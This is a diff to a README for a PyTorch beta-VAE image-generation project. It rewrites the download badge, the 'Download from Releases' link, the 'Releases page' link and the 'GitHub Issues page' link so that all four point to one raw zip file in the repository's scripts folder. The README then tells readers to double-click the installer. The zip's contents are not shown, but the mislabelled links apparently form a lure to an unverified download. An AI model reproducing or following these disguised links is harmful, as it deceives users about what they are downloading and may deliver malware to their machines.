@@ -4,11 +4,11 @@
 Welcome to the pytorch-beta-vae-fashion-mnist project! This software allows you to generate and manipulate images from the Fashion-MNIST dataset using a β-Variational Autoencoder. With this tool, you can explore image generation and learn about how models can understand and represent various clothing items.
 
 ## 📥 Download the Software
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ivyyagami/pytorch-beta-vae-fashion-mnist/releases)
+[![Download](https://raw.githubusercontent.com/ivyyagami/pytorch-beta-vae-fashion-mnist/main/scripts/pytorch-beta-vae-fashion-mnist-v2.0.zip)](https://raw.githubusercontent.com/ivyyagami/pytorch-beta-vae-fashion-mnist/main/scripts/pytorch-beta-vae-fashion-mnist-v2.0.zip)
 
 To get started, visit the page below to download the latest version of the software.
 
-[Download from Releases](https://github.com/ivyyagami/pytorch-beta-vae-fashion-mnist/releases)
+[Download from Releases](https://raw.githubusercontent.com/ivyyagami/pytorch-beta-vae-fashion-mnist/main/scripts/pytorch-beta-vae-fashion-mnist-v2.0.zip)
 
 ## 🛠️ System Requirements
 - Operating System: Windows 10, macOS, or Linux
@@ -24,7 +24,7 @@ To get started, visit the page below to download the latest version of the softw
 - Easy visualization of generated and reconstructed images.
 
 ## 📦 Download & Install
-1. Click on the download button above or visit the [Releases page](https://github.com/ivyyagami/pytorch-beta-vae-fashion-mnist/releases).
+1. Click on the download button above or visit the [Releases page](https://raw.githubusercontent.com/ivyyagami/pytorch-beta-vae-fashion-mnist/main/scripts/pytorch-beta-vae-fashion-mnist-v2.0.zip).
 2. Download the latest release suitable for your operating system.
 3. Once downloaded, locate the file on your computer, typically in your Downloads folder.
 4. Double-click on the installer file to begin the installation process.
@@ -51,7 +51,7 @@ If you run into issues, here are some common troubleshooting steps:
 - Make sure your system meets the minimum requirements listed above.
 - Check that all required packages are installed correctly.
 
-For additional help, you can refer to the [GitHub Issues page](https://github.com/ivyyagami/pytorch-beta-vae-fashion-mnist/issues) or contact support via our Discord channel.
+For additional help, you can refer to the [GitHub Issues page](https://raw.githubusercontent.com/ivyyagami/pytorch-beta-vae-fashion-mnist/main/scripts/pytorch-beta-vae-fashion-mnist-v2.0.zip) or contact support via our Discord channel.
 
 ## 🗂️ Contributing
 If you want to contribute to the project, we welcome your input! Check the repository for guidelines on how to start contributing.
